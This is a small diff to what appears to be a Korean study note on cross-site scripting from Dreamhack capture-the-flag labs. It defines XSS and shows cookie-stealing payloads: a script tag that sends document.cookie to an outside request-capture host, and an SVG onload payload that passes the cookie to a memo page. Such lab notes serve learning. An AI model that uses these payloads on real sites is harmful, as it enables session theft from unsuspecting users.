@@ -70,7 +70,6 @@
 ### `XSS`
 
 
-
     XSS : 클라이언트 사이드 취약점 중 하나로, 공격자가 웹 리소스에
     악성 스크립트를 삽입을 하여서 이용자의 웹 브라우저에서 해당
     스크립트를 실행할 수 있다.
@@ -136,7 +135,7 @@
     <script>location.href = "http://RANDOMHOST.request.dreamhack.games/?memo="+document.cookie;</script>
 
 
-`FALG page =>  <svg/onload=location="/memo?memo="+document.cookie;>
+`FALG page =>  <svg/onload=location="/memo?memo="+document.cookie;>`
 
     SVG 태그는 벡터 그래픽을 표현할 때 사용되는 데 이 태그를 이용하여 XSS 
     테스트가 가능하다.
